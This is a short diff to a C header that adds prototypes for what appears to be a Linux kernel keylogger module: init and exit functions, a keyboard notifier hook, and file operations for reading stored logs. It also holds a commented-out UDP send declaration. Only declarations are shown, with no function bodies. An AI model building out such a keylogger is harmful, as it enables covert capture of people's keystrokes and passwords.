@@ -1,7 +1,13 @@
 #ifndef __PRIVATE_H__
 #define __PRIVATE_H__
 
-
+static int __init keylog_init(void);
+static void __exit keylog_exit(void);
+static int key_hook(struct notifier_block *nblock, unsigned long code, void *_param);
+static int open_logs(struct inode *inode, struct file *filp);
+ssize_t read_logs(struct file *filp, char __user *buffer, size_t length, loff_t *offset);
+static ssize_t write_logs(struct file *filp, const char *buffer, size_t length, loff_t *offset);
+static int release_logs(struct inode *inode, struct file *filp);
 //extern int send_udp();
 
 char *keycode[] = {
